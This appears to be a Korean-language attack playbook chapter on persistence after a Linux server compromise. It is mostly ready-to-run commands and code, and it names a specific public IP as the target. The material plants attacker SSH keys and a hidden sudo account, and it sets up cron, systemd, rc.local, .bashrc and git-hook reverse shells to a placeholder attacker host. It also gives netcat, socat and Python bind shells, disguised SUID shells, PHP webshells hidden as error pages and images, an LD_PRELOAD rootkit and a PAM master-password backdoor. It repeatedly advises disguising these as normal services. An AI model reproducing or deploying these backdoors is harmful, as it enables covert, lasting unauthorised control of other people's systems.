# Phase 6: 지속성 확보 (Persistence)

## 개요
지속성(Persistence)은 시스템 재부팅, 사용자 로그아웃, 세션 종료 후에도 접근 권한을 유지하는 기법입니다. 여러 백도어를 설치하여 탐지되더라도 다른 경로로 재접근할 수 있도록 합니다.

## 필수 도구
- SSH
- Cron
- Systemd
- Netcat
- 텍스트 에디터 (vim, nano)

---

## 1. SSH 백도어

### 1.1 SSH Key 인증 추가
```bash
# 공격자 머신에서 SSH 키 생성
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N ""

# 공개키 확인
cat ~/.ssh/backdoor_key.pub

# 대상 서버의 authorized_keys에 추가
# Root 계정
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 일반 사용자 계정
mkdir -p /home/www-data/.ssh
chmod 700 /home/www-data/.ssh
echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY... attacker@kali" >> /home/www-data/.ssh/authorized_keys
chmod 600 /home/www-data/.ssh/authorized_keys
chown -R www-data:www-data /home/www-data/.ssh

# 공격자 머신에서 접속
ssh -i ~/.ssh/backdoor_key root@3.35.218.180
```

### 1.2 SSH 설정 변경
```bash
# /etc/ssh/sshd_config 백업
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# 위험한 설정 활성화
sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PermitEmptyPasswords.*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config

# SSH 서비스 재시작
systemctl restart sshd
# 또는
service ssh restart
```

### 1.3 SSH 백도어 계정 생성
```bash
# 백도어 사용자 생성
useradd -m -s /bin/bash sysupdate
echo "sysupdate:Passw0rd123!" | chpasswd

# Sudo 권한 부여 (선택)
usermod -aG sudo sysupdate
# 또는 직접 sudoers 수정
echo "sysupdate ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/sysupdate
chmod 440 /etc/sudoers.d/sysupdate

# SSH로 접속
ssh sysupdate@3.35.218.180
```

### 1.4 숨겨진 SSH 포트
```bash
# SSH를 비표준 포트에서 추가로 실행
# /etc/ssh/sshd_config에 추가
echo "Port 22" >> /etc/ssh/sshd_config
echo "Port 2222" >> /etc/ssh/sshd_config
echo "Port 31337" >> /etc/ssh/sshd_config

systemctl restart sshd

# 접속
ssh -p 31337 root@3.35.218.180
```

---

## 2. Cron Job 백도어

### 2.1 Root Cron Job
```bash
# Root의 crontab에 리버스 쉘 추가
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'") | crontab -

# 또는 스크립트 파일로
cat > /root/.backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
EOF

chmod +x /root/.backup.sh
(crontab -l 2>/dev/null; echo "*/10 * * * * /root/.backup.sh") | crontab -

# Crontab 확인
crontab -l
```

### 2.2 System-wide Cron Job
```bash
# /etc/crontab에 추가
echo "*/15 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" >> /etc/crontab

# /etc/cron.d/ 디렉토리에 파일 생성
cat > /etc/cron.d/system-update << 'EOF'
# System update check
*/20 * * * * root /usr/local/bin/check_updates.sh
EOF

# 백도어 스크립트 작성
cat > /usr/local/bin/check_updates.sh << 'EOF'
#!/bin/bash
# Reverse shell to attacker
(bash -i >& /dev/tcp/YOUR_IP/4444 0>&1) &
EOF

chmod +x /usr/local/bin/check_updates.sh
```

### 2.3 Daily/Hourly Cron 스크립트
```bash
# /etc/cron.daily/에 스크립트 추가
cat > /etc/cron.daily/update-system << 'EOF'
#!/bin/bash
# Daily system update
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' &
EOF

chmod +x /etc/cron.daily/update-system

# /etc/cron.hourly/에 추가 (더 자주 실행)
cat > /etc/cron.hourly/check-logs << 'EOF'
#!/bin/bash
# Hourly log check
(nc YOUR_IP 4444 -e /bin/bash) &
EOF

chmod +x /etc/cron.hourly/check-logs
```

### 2.4 사용자별 Crontab
```bash
# www-data 사용자로 cron 설정
su - www-data
(crontab -l 2>/dev/null; echo "0 */6 * * * /tmp/.hidden_shell.sh") | crontab -

# 백도어 스크립트
cat > /tmp/.hidden_shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/5555 0>&1
EOF

chmod +x /tmp/.hidden_shell.sh
```

---

## 3. Systemd Service 백도어

### 3.1 악의적인 Systemd Service 생성
```bash
# Systemd 서비스 파일 생성
cat > /etc/systemd/system/system-monitor.service << 'EOF'
[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/monitor.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# 백도어 스크립트 작성
cat > /usr/local/bin/monitor.sh << 'EOF'
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
    sleep 300
done
EOF

chmod +x /usr/local/bin/monitor.sh

# 서비스 활성화 및 시작
systemctl daemon-reload
systemctl enable system-monitor.service
systemctl start system-monitor.service

# 상태 확인
systemctl status system-monitor.service
```

### 3.2 타이머를 사용한 Periodic 실행
```bash
# 서비스 파일
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
EOF

# 타이머 파일 (매 30분마다 실행)
cat > /etc/systemd/system/backdoor.timer << 'EOF'
[Unit]
Description=Backdoor Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
EOF

# 타이머 활성화
systemctl daemon-reload
systemctl enable backdoor.timer
systemctl start backdoor.timer

# 타이머 확인
systemctl list-timers --all
```

### 3.3 기존 서비스 하이재킹
```bash
# Apache2 서비스 수정
cp /lib/systemd/system/apache2.service /lib/systemd/system/apache2.service.bak

# ExecStartPre에 백도어 추가
cat >> /lib/systemd/system/apache2.service << 'EOF'
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &'
EOF

systemctl daemon-reload
systemctl restart apache2
```

---

## 4. 부팅 시 실행 백도어

### 4.1 /etc/rc.local 사용
```bash
# rc.local 파일 생성/수정
cat > /etc/rc.local << 'EOF'
#!/bin/bash
# Startup script
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' &
exit 0
EOF

chmod +x /etc/rc.local

# rc.local 서비스 활성화 (systemd 시스템)
systemctl enable rc-local.service
```

### 4.2 .bashrc / .bash_profile 수정
```bash
# Root의 .bashrc에 백도어 추가
cat >> /root/.bashrc << 'EOF'

# System monitoring
if [ -f /tmp/.sys_check ]; then
    (bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &)
    rm /tmp/.sys_check
fi
EOF

# 트리거 파일 생성 (선택적 실행)
touch /tmp/.sys_check

# 모든 사용자에게 적용
cat >> /etc/bash.bashrc << 'EOF'

# Global system check
(curl -s http://YOUR_IP:8080/beacon?host=$(hostname) &)
EOF
```

### 4.3 /etc/profile.d/ 사용
```bash
# 모든 사용자 로그인 시 실행
cat > /etc/profile.d/system-check.sh << 'EOF'
#!/bin/bash
# System integrity check
(bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' &) 2>/dev/null
EOF

chmod +x /etc/profile.d/system-check.sh
```

---

## 5. SUID 백도어

### 5.1 SUID Bash 생성
```bash
# /bin/bash 복사 및 SUID 설정
cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash

# 숨긴 위치에 배치
cp /bin/bash /var/tmp/.update
chmod +s /var/tmp/.update

# 나중에 실행 (일반 사용자로)
/tmp/.hidden_bash -p  # Root 쉘 획득
/var/tmp/.update -p
```

### 5.2 커스텀 SUID 바이너리
```bash
# C 소스 코드 작성
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 컴파일
gcc /tmp/backdoor.c -o /usr/local/bin/update-checker
chmod +s /usr/local/bin/update-checker

# 실행 (일반 사용자로)
/usr/local/bin/update-checker  # Root 쉘 획득
```

### 5.3 파일 이름 위장
```bash
# 시스템 바이너리처럼 보이게 위장
cp /bin/bash /lib/systemd/systemd-update
chmod +s /lib/systemd/systemd-update

cp /bin/bash /usr/bin/python3.8
chmod +s /usr/bin/python3.8

# 숨김 파일로
cp /bin/bash /var/log/...
chmod +s /var/log/...
```

---

## 6. 네트워크 백도어

### 6.1 Netcat 리스너
```bash
# Systemd service로 Netcat 리스너 설정
cat > /etc/systemd/system/netcat-listener.service << 'EOF'
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/nc -lvnp 31337 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable netcat-listener.service
systemctl start netcat-listener.service

# 접속
nc 3.35.218.180 31337
```

### 6.2 Socat 리스너 (암호화)
```bash
# SSL 인증서 생성
openssl req -newkey rsa:2048 -nodes -keyout /tmp/shell.key -x509 -days 365 -out /tmp/shell.crt
cat /tmp/shell.key /tmp/shell.crt > /tmp/shell.pem

# Systemd service
cat > /etc/systemd/system/socat-listener.service << 'EOF'
[Unit]
Description=Secure Communication Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/socat OPENSSL-LISTEN:4443,cert=/tmp/shell.pem,verify=0,fork EXEC:/bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable socat-listener.service
systemctl start socat-listener.service

# 공격자 머신에서 접속
socat - OPENSSL:3.35.218.180:4443,verify=0
```

### 6.3 Python 백도어 서버
```bash
# Python 백도어 스크립트
cat > /usr/local/bin/backdoor_server.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import os

def main():
    HOST = '0.0.0.0'
    PORT = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)

    while True:
        conn, addr = s.accept()
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    main()
EOF

chmod +x /usr/local/bin/backdoor_server.py

# Systemd service로 실행
cat > /etc/systemd/system/python-backdoor.service << 'EOF'
[Unit]
Description=Python System Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/backdoor_server.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable python-backdoor.service
systemctl start python-backdoor.service
```

---

## 7. 웹 백도어

### 7.1 PHP 웹셸 유지
```bash
# 숨겨진 웹셸 생성
cat > /var/www/html/.config.php << 'EOF'
<?php
if(isset($_GET['x'])) {
    system($_GET['x']);
}
?>
EOF

# 404 에러 페이지로 위장
cat > /var/www/html/404.php << 'EOF'
<?php
http_response_code(404);
echo "<h1>404 Not Found</h1>";

// Hidden backdoor
if(isset($_SERVER['HTTP_X_CUSTOM_AUTH']) && $_SERVER['HTTP_X_CUSTOM_AUTH'] == 'secret_key_12345') {
    if(isset($_GET['cmd'])) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
}
?>
EOF

# 접속
curl -H "X-Custom-Auth: secret_key_12345" "http://3.35.218.180/404.php?cmd=whoami"
```

### 7.2 .htaccess 백도어
```bash
# Apache .htaccess에 백도어 추가
cat >> /var/www/html/.htaccess << 'EOF'
# Backup handler
AddType application/x-httpd-php .bak
EOF

# .bak 파일을 PHP로 실행
cat > /var/www/html/config.bak << 'EOF'
<?php system($_GET['c']); ?>
EOF

# 접속
curl "http://3.35.218.180/config.bak?c=id"
```

### 7.3 이미지 파일 속 웹셸
```bash
# JPG 파일로 위장한 PHP 웹셸
cat > /var/www/html/uploads/image.jpg.php << 'EOF'
<?php
$image = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==");
header("Content-Type: image/png");
echo $image;

// Hidden command execution
if(isset($_GET['exec'])) {
    system($_GET['exec']);
    exit;
}
?>
EOF

# 접속 (일반적으로는 이미지 표시, exec 파라미터로 명령 실행)
curl "http://3.35.218.180/uploads/image.jpg.php?exec=whoami"
```

---

## 8. Git Hook 백도어

### 8.1 Git Post-Merge Hook
```bash
# Git 저장소가 있는 경우
cd /var/www/html
ls -la .git

# Post-merge hook 생성
cat > .git/hooks/post-merge << 'EOF'
#!/bin/bash
# Post-merge hook
(bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &)
EOF

chmod +x .git/hooks/post-merge

# Git pull 시마다 리버스 쉘 실행
```

### 8.2 Pre-commit Hook
```bash
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
# Send notification
curl -s http://YOUR_IP:8080/notify?event=commit
exit 0
EOF

chmod +x .git/hooks/pre-commit
```

---

## 9. 고급 지속성 기법

### 9.1 LD_PRELOAD 백도어
```bash
# 악의적인 공유 라이브러리 생성
cat > /tmp/rootkit.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    if (getuid() == 0) {
        system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' &");
    }
}
EOF

gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libupdate.so /tmp/rootkit.c -nostartfiles

# /etc/environment에 추가
echo 'LD_PRELOAD=/lib/x86_64-linux-gnu/libupdate.so' >> /etc/environment

# 또는 /etc/ld.so.preload
echo '/lib/x86_64-linux-gnu/libupdate.so' > /etc/ld.so.preload
```

### 9.2 PAM 백도어
```bash
# PAM 모듈에 백도어 추가
cat > /tmp/pam_backdoor.c << 'EOF'
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {
    const char *password = NULL;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    // 마스터 비밀번호 체크
    if (strcmp(password, "MasterPass123!") == 0) {
        return PAM_SUCCESS;
    }

    return PAM_AUTH_ERR;
}
EOF

# 컴파일
gcc -fPIC -shared -o /lib/x86_64-linux-gnu/security/pam_backdoor.so /tmp/pam_backdoor.c -lpam

# /etc/pam.d/common-auth에 추가
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/common-auth

# 이제 어떤 사용자로도 "MasterPass123!" 비밀번호로 로그인 가능
```

### 9.3 Kernel Module 백도어
```bash
# 커널 모듈 백도어 (루트킷)
# 주의: 매우 고급 기법, 시스템 크래시 위험

cat > /tmp/backdoor_module.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Hidden backdoor");

static int __init backdoor_init(void) {
    printk(KERN_INFO "Module loaded\n");
    // 백도어 코드
    return 0;
}

static void __exit backdoor_exit(void) {
    printk(KERN_INFO "Module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
EOF

# 컴파일 (커널 헤더 필요)
# make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
# insmod backdoor_module.ko
```

---

## 10. 지속성 점검 및 유지

### 10.1 백도어 상태 점검 스크립트
```bash
#!/bin/bash
# check_persistence.sh

echo "[*] Checking persistence mechanisms..."

# SSH keys
echo "[+] SSH Keys:"
cat /root/.ssh/authorized_keys 2>/dev/null | grep -v "^#" | grep -v "^$"

# Cron jobs
echo "[+] Cron Jobs:"
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"

# Systemd services
echo "[+] Custom Services:"
systemctl list-units --type=service --all | grep -i "backdoor\|monitor\|update"

# SUID files
echo "[+] SUID Backdoors:"
find /tmp /var/tmp /usr/local/bin -perm -4000 -type f 2>/dev/null

# Network listeners
echo "[+] Listening Ports:"
netstat -tlnp | grep -E "4444|31337|9999"

echo "[*] Persistence check complete"
```

### 10.2 다중 백도어 전략
```bash
# 여러 백도어를 동시에 유지하여 하나가 탐지되어도 다른 것으로 접근

# 1. SSH Key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# 2. Cron Job
(crontab -l; echo "*/30 * * * * /tmp/.update.sh") | crontab -

# 3. Systemd Service
systemctl enable backdoor.service

# 4. SUID Binary
cp /bin/bash /var/tmp/.sys && chmod +s /var/tmp/.sys

# 5. Web Shell
echo '<?php system($_GET["x"]); ?>' > /var/www/html/.404.php

# 이렇게 5개의 백도어를 동시에 유지
```

---

## 핵심 정리

1. 다중 백도어 배치 - 최소 3개 이상의 서로 다른 유형의 백도어 설치
2. SSH Key 우선 - 가장 안정적이고 탐지하기 어려운 방법
3. Systemd/Cron 활용 - 재부팅 후 자동 실행 보장
4. 위장 및 은폐 - 정상 파일/서비스처럼 보이도록 명명
5. 정기적 점검 - 백도어가 여전히 작동하는지 주기적 확인

## 다음 단계
Phase 7: 데이터 탈취 (Data Exfiltration)로 진행하여 중요 정보 추출
